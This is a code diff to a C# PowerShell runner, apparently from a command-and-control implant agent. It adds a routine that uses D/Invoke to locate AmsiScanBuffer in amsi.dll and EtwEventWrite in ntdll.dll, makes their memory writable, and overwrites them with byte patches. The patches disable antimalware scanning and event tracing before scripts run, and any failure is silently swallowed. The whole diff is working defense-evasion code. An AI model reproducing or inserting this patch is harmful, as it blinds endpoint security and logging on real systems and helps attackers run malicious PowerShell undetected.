@@ -6,6 +6,8 @@ using System.Management.Automation.Runspaces;
 using System;
 using System.Threading;
 using System.Collections.Generic;
+using System.Runtime.InteropServices;
+using WinAPI.DInvoke;
 
 namespace Agent.Commands.Execution
 {
@@ -18,6 +20,8 @@ namespace Agent.Commands.Execution
 
         public PowerShellRunner()
         {
+            PatchAmsiAndEtw();
+
             _host = new CustomPSHost();
 
             var state = InitialSessionState.CreateDefault();
@@ -27,6 +31,45 @@ namespace Agent.Commands.Execution
             _rs = RunspaceFactory.CreateRunspace(_host, state);
             _rs.Open();
             _pipeline = _rs.CreatePipeline();
+        }
+
+        private static void PatchFunction(string moduleName, string functionName, byte[] patch)
+        {
+            try
+            {
+                var hModule = Generic.GetLoadedModuleAddress(moduleName);
+                if (hModule == IntPtr.Zero)
+                    hModule = Generic.LoadModuleFromDisk(moduleName);
+
+                if (hModule == IntPtr.Zero)
+                    return;
+
+                var pFunc = Generic.GetExportAddress(hModule, functionName);
+                if (pFunc == IntPtr.Zero)
+                    return;
+
+                var regionSize = (IntPtr)patch.Length;
+                var oldProtect = WinAPI.DInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), ref pFunc, ref regionSize, WinAPI.DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE);
+
+                Marshal.Copy(patch, 0, pFunc, patch.Length);
+
+                WinAPI.DInvoke.Native.NtProtectVirtualMemory((IntPtr)(-1), ref pFunc, ref regionSize, oldProtect);
+            }
+            catch
+            {
+                // silently continue if patching fails
+            }
+        }
+
+        private static void PatchAmsiAndEtw()
+        {
+            // AMSI: AmsiScanBuffer -> mov eax, 0x80070057 (E_INVALIDARG); ret
+            var amsiPatch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            PatchFunction("amsi.dll", "AmsiScanBuffer", amsiPatch);
+
+            // ETW: EtwEventWrite -> ret 0x14
+            var etwPatch = new byte[] { 0xC2, 0x14, 0x00 };
+            PatchFunction("ntdll.dll", "EtwEventWrite", etwPatch);
         }
 
         public void ImportScript(string script)
